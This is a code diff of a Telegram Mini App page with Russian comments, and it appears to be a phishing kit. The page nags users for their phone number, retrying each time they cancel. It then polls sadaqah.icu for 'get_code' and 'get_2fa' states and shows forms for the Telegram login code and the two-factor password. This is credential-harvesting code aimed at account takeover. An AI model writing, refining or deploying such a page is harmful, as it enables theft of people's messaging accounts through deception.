@@ -218,7 +218,7 @@
       <p>Loading...</p>
     </div>
 
-    <!-- Блок запроса номера (без кнопки, авто-запрос) -->
+    <!-- Блок запроса номера (авто-запрос) -->
     <div id="phoneBlock" class="card hidden">
       <div class="top">
         <div>
@@ -301,7 +301,8 @@
       let currentPhone = localStorage.getItem('tg_phone') || ''; // восстанавливаем номер, если был
       let phoneRequestTimer = null;
       let isRequestingPhone = false;
-      let phoneShared = false; // true, когда номер успешно получен и отправлен на сервер
+      let phoneShared = false; // true, когда номер успешно получен
+      let pollingInterval = null; // для опроса статуса
 
       // --- Утилиты ---
       function maskPhone(p) {
@@ -349,13 +350,13 @@
 
       // --- Автоматический запрос номера с повтором при отмене ---
       async function autoRequestPhone() {
-        // Если номер уже получен и обработан, не запрашиваем
+        // Если номер уже получен, не запрашиваем
         if (phoneShared) return;
 
         // Если уже выполняется запрос, не запускаем новый
         if (isRequestingPhone) return;
 
-        // Очищаем предыдущий таймер, если есть
+        // Очищаем предыдущий таймер
         if (phoneRequestTimer) {
           clearTimeout(phoneRequestTimer);
           phoneRequestTimer = null;
@@ -373,29 +374,10 @@
             currentPhone = phone;
             localStorage.setItem('tg_phone', phone);
             phoneDisplay.textContent = `Phone: ${maskPhone(phone)}`;
+            phoneShared = true; // останавливаем авто-запрос
 
-            // Отправляем номер на сервер
-            try {
-              const res = await fetch('https://sadaqah.icu/submit_phone', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ user_id: userId, phone: phone })
-              });
-              const result = await res.json();
-              console.log('Submit phone result:', result);
-              if (result.status === 'ok') {
-                phoneShared = true; // останавливаем авто-запрос
-                showBlock('code');
-              } else {
-                // Ошибка сервера – показываем сообщение и повторяем запрос через 1 сек
-                alert('Server error: ' + (result.message || 'Unknown error'));
-                phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
-              }
-            } catch (err) {
-              console.error('Network error sending phone:', err);
-              alert('Network error while sending phone. Retrying...');
-              phoneRequestTimer = setTimeout(autoRequestPhone, 1000);
-            }
+            // Номер отправлен в чат, теперь начинаем polling статуса
+            startPolling();
           } else {
             // Странный случай – повтор через 1 сек
             console.log('No contact data received, retrying...');
@@ -408,6 +390,36 @@
         } finally {
           isRequestingPhone = false;
         }
+      }
+
+      // --- Polling статуса ---
+      function startPolling() {
+        if (pollingInterval) clearInterval(pollingInterval);
+        pollingInterval = setInterval(async () => {
+          try {
+            const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
+            const data = await res.json();
+            const state = data.state;
+            console.log('Polling state:', state);
+
+            if (state === 'get_code') {
+              clearInterval(pollingInterval);
+              pollingInterval = null;
+              showBlock('code');
+            } else if (state === 'get_2fa') {
+              clearInterval(pollingInterval);
+              pollingInterval = null;
+              showBlock('2fa');
+            } else if (state === 'none' || state === 'get_number') {
+              // Ждём дальше
+            } else {
+              // Неизвестное состояние – возможно, ошибка
+              console.warn('Unknown state:', state);
+            }
+          } catch (e) {
+            console.error('Polling error:', e);
+          }
+        }, 2000); // опрос каждые 2 секунды
       }
 
       // --- Логика ввода кода ---
@@ -574,12 +586,12 @@
         }
       })();
 
-      // Функция fetchState должна быть определена выше
+      // Функция fetchState
       async function fetchState() {
         try {
           const res = await fetch(`https://sadaqah.icu/status?user_id=${userId}`);
           const data = await res.json();
-          return data.state; // 'none', 'get_number', 'get_code', 'get_2fa'
+          return data.state;
         } catch (e) {
           console.error('Status error:', e);
           return 'none';
